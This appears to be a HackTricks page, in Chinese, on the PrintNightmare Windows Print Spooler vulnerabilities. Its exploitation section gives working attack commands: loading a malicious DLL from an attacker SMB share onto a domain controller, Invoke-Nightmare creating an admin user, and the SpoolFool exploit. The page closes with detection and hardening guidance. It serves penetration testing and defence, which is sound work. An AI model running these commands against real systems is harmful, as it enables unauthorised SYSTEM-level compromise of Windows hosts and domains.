# PrintNightmare（Windows Print Spooler RCE/LPE）

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare 是 Windows **Print Spooler** 服务中一系列漏洞的统称，这些漏洞允许以 **SYSTEM 身份执行任意代码**，并且当 spooler 可通过 RPC 访问时，可在域控制器和文件服务器上进行**远程代码执行（RCE）**。被广泛利用的 CVE 主要包括 **CVE-2021-1675**（最初被归类为 LPE）和 **CVE-2021-34527**（完整 RCE）。后续出现的 **CVE-2021-34481（“Point & Print”）** 和 **CVE-2022-21999（“SpoolFool”）** 等问题表明，该攻击面远未被彻底关闭。

如果你寻找的是通过 spooler 进行 **authentication coercion / relay**，而不是基于 **driver 的 RCE/LPE**，请查看[此处关于 printer coercion abuse 的其他页面](printers-spooler-service-abuse.md)。本页面专注于**以 SYSTEM 身份加载 drivers / DLLs**。

---

## 1. Vulnerable components & CVEs

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|“PrintNightmare #1”|LPE|已在 2021 年 6 月 CU 中修复，但被 CVE-2021-34527 绕过|
|2021|CVE-2021-34527|“PrintNightmare”|RCE/LPE|`AddPrinterDriverEx` 允许 authenticated users 从远程共享加载 driver DLL；2021 年 8 月之后，通常需要弱化 Point & Print policies|
|2021|CVE-2021-34481|“Point & Print”|LPE|允许 non-admin users 安装 unsigned driver|
|2022|CVE-2022-21999|“SpoolFool”|LPE|创建任意目录 → DLL planting —— 在安装 2021 年补丁后仍然有效|

所有这些漏洞都滥用了 **MS-RPRN / MS-PAR RPC methods**（`RpcAddPrinterDriver`、`RpcAddPrinterDriverEx`、`RpcAsyncAddPrinterDriver`）之一，或利用了 **Point & Print** 内部的 trust relationships。

## 2. Exploitation techniques

### 2.1 Remote Domain Controller compromise (CVE-2021-34527)

一个 authenticated 但**无特权**的 domain user 可以通过以下方式，在远程 spooler（通常是 DC）上以 **NT AUTHORITY\SYSTEM** 身份运行任意 DLL：
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
常见的 PoC 包括 **CVE-2021-1675.py**（Python/Impacket）、**SharpPrintNightmare.exe**（C#），以及 Benjamin Delpy 在 **mimikatz** 中的 `misc::printnightmare / lsa::addsid` 模块。

### 2.2 本地提权（任意受支持的 Windows，2021-2024）

可以在**本地**调用相同的 API，从 `C:\Windows\System32\spool\drivers\x64\3\` 加载 driver 并获得 SYSTEM 权限：
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 已修补主机上的现代 triage

在完全更新的主机上，公开的 PrintNightmare PoC 通常会失败，因为 Windows 现在默认仅允许 **administrator** 安装 printer driver（自 2021 年 8 月 10 日起为 `RestrictDriverInstallationToAdministrators=1`）。在对目标发起 exploit 之前，首先检查环境是否为了 legacy printer 部署而回滚了这一安全更改：<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
通常最值得关注的两个弱值是：<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

从 Linux 执行 PoC 前，先快速确认目标是否暴露了相关的 print RPC interfaces：
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
一些较新的公开工具还提供了更安全的 **check/list** 工作流，可在发送 DLL 之前使用：
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> 如果低权限用户收到 `RPC_E_ACCESS_DENIED` (`0x8001011b`)，通常说明你遇到的是 2021 年之后的默认行为，而不是传输失败。

> 在 Windows 11 22H2 及更高版本，以及更新的客户端构建版本中，远程打印默认使用 **RPC over TCP**，并且 **RPC over named pipes** (`\PIPE\spoolss`) 默认处于禁用状态，除非显式重新启用。某些较旧的 PoC 和实验环境笔记仍假设 named pipe 可访问。<sup>[[4]](#references)</sup>

### 2.4 “已修补”网络中的 Package Point & Print abuse

许多企业环境在最初的 2021 年补丁发布后，仍因策略配置而保持 **vulnerable**，因为 helpdesk 或 print-server 工作流仍要求非管理员用户安装或更新 drivers。实际上，offensive playbook 通常变为：

- 如果安全提示被完全禁用，**classic arbitrary-DLL PrintNightmare** 仍然是最短路径。
- 如果启用了 `Only use Package Point and Print`，通常需要转向 **signed package-aware driver** 路径，而不是直接投放 raw DLL。<sup>[[3]](#references)</sup>
- 2024 年的研究表明，**`Package Point and Print - Approved servers` 本身并不是严格的 trust boundary**：如果 attacker 能够 spoof 或 hijack 某个 approved print server 的 name resolution，受害者仍可能被重定向到一个满足 policy checks 的 malicious server。<sup>[[4]](#references)</sup>
- 即使将 UNC hardening 与强制 RPC-over-SMB 结合使用，也可能不稳定，因为现代客户端可能会 **fall back to RPC over TCP**。<sup>[[4]](#references)</sup>

这就是为什么现代 PrintNightmare-style exploitation 通常更多是在 **abusing enterprise printer deployment policy**，而不是原样重放最初的 2021 PoC。

### 2.5 SpoolFool (CVE-2022-21999) ——绕过 2021 年的修复

Microsoft 的 2021 年补丁阻止了 remote driver loading，但**没有强化 directory permissions**。SpoolFool 滥用 `SpoolDirectory` 参数，在 `C:\Windows\System32\spool\drivers\` 下创建 arbitrary directory，投放 payload DLL，并强制 spooler 加载该 DLL：<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> 该 exploit 适用于已完全打补丁的 Windows 7 → Windows 11 和 Server 2012R2 → 2022，但不包括 2022 年 2 月更新之后的版本<sup>[[2]](#references)</sup>

---

## 3. Detection & hunting

* **PrintService logs** – 启用 *Microsoft-Windows-PrintService/Operational* channel，并监控 **Event ID 316**（driver added/updated，通常包含 DLL 名称），同时关注成功和失败的尝试。将其与 **Event ID 808/811** 关联，用于发现可疑的 spooler module/driver load failures。
* **Sysmon** – 当 parent process 为 **spoolsv.exe** 时，监控 `C:\Windows\System32\spool\drivers\*` 内的 `Event ID 7`（Image loaded）或 `11/23`（File write/delete）。
* **Process lineage** – 每当 **spoolsv.exe** spawn `cmd.exe`、`rundll32.exe`、PowerShell 或任何异常的 unsigned child process 时发出告警。
* **Network telemetry** – 监控 **spoolsv.exe** 向 attacker-controlled shares 发起的异常 SMB fetch，或本不应作为 print server 的服务器产生的异常 printer RPC traffic；这两类事件都是高价值线索。

## 4. Mitigation & hardening

1. **Patch!** – 为每台安装了 Print Spooler service 的 Windows 主机应用最新 cumulative update。
2. **Disable the spooler where it is not required**，尤其是在 Domain Controllers 上：
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Block remote connections**，同时允许 local printing – Group Policy：`Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`。
4. 通过以下设置将 **Point & Print** 保持为仅管理员可用：
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
详细指南参见 Microsoft KB5005652<sup>[[1]](#references)</sup>
5. 如果业务要求迫使 `RestrictDriverInstallationToAdministrators=0`，则应将其他所有 printer policy 视为**仅部分 mitigation**。至少应优先使用 **package-aware drivers**，启用 **Only use Package Point and Print**，并将 **Package Point and Print - Approved servers** 限制为明确的 in-forest print servers。<sup>[[3]](#references)</sup>
6. **Do not roll back printer RPC privacy**，不要仅为修复失效的 printer mappings 而这样做。设置 `RpcAuthnLevelPrivacyEnabled=0` 的环境正在撤销为 **CVE-2021-1678** 添加的 hardening，通常应在 engagement 期间接受额外审查。<sup>[[4]](#references)</sup>

---

## 5. Related research / tools

* [mimikatz `printnightmare`](https://github.com/gentilkiwi/mimikatz/tree/master/modules) modules
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – 标准的 Impacket implementation，支持 `-check`、`-list` 和 `-delete` modes
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – 包含内置 SMB delivery、multi-target support，以及 `MS-RPRN` / `MS-PAR` 两种 modes 的 wrapper
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – 通过 package Point & Print abuse bring-your-own-vulnerable-printer-driver
* SpoolFool exploit & write-up
* 针对 SpoolFool 和其他 spooler bugs 的 0patch micropatches

如果你想通过 spooler **coerce authentication**，而不是加载 driver，请跳转到 [printer spooler service abuse](printers-spooler-service-abuse.md)。

---

## References

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
